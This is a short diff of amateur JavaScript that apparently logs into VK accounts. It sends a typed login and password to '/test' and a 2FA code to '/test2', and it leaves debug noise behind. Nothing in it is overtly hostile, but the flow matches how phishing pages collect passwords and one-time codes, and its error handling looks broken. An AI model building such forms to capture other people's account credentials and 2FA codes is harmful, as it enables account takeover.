@@ -30,34 +30,51 @@ function a(VkAccount, two_fa = null, code = null){
 
 
 function auth(){
-    login = document.getElementById('login').value
-    pass = document.getElementById('pass').value
-    console.log(login);
-    // $.post( "/test", {
-    //     'login': VkAccount.login,
-    //     'pass' : VkAccount.password 
-    // })
-    this.resp = null
-    $(function () {
-        $.ajax({
-            url: '/test',
-            type: 'POST',
-            contentType: 'application/json;charset=UTF-8',
-            dataType: 'json',
-            data : JSON.stringify({
-                'login': login,
-                'pass' : pass 
-            }),
-            success: function (response) {
-                console.log(response);
-                if (response['2fa_required']) {
-                    b()
-                }
-                console.log('dsfgdsfgdfsgdfgdsfgdfsgdfgdfgdfsgdfsgdsgdfsgdsgsdfgdfsgdfsg');
-            },
-            error: function (error) {}
-        });
-    })
+    try {
+        login = document.getElementById('login').value
+        pass = document.getElementById('pass').value
+        console.log(login);
+        this.resp = null
+        $(function () {
+            $.ajax({
+                url: '/test',
+                type: 'POST',
+                contentType: 'application/json;charset=UTF-8',
+                dataType: 'json',
+                data : JSON.stringify({
+                    'login': login,
+                    'pass' : pass 
+                }),
+                success: function (response) {
+                    console.log(response);
+                    if (response['2fa_required']) {
+                        b()
+                    }
+                    console.log('dsfgdsfgdfsgdfgdsfgdfsgdfgdfgdfsgdfsgdsgdfsgdsgsdfgdfsgdfsg');
+                },
+                error: function (error) {}
+            });
+        })
+    } catch (error) {
+        console.log('12312312');
+        code = document.getElementById('2fa').value
+        $(function () {
+            $.ajax({
+                url: '/test2',
+                type: 'POST',
+                contentType: 'application/json;charset=UTF-8',
+                dataType: 'json',
+                data : JSON.stringify({
+                    'code': String(code)
+                }),
+                success: function (response) {
+                },
+                error: function (error) {}
+            });
+        })
+    }
+    
+    
     
     
 }
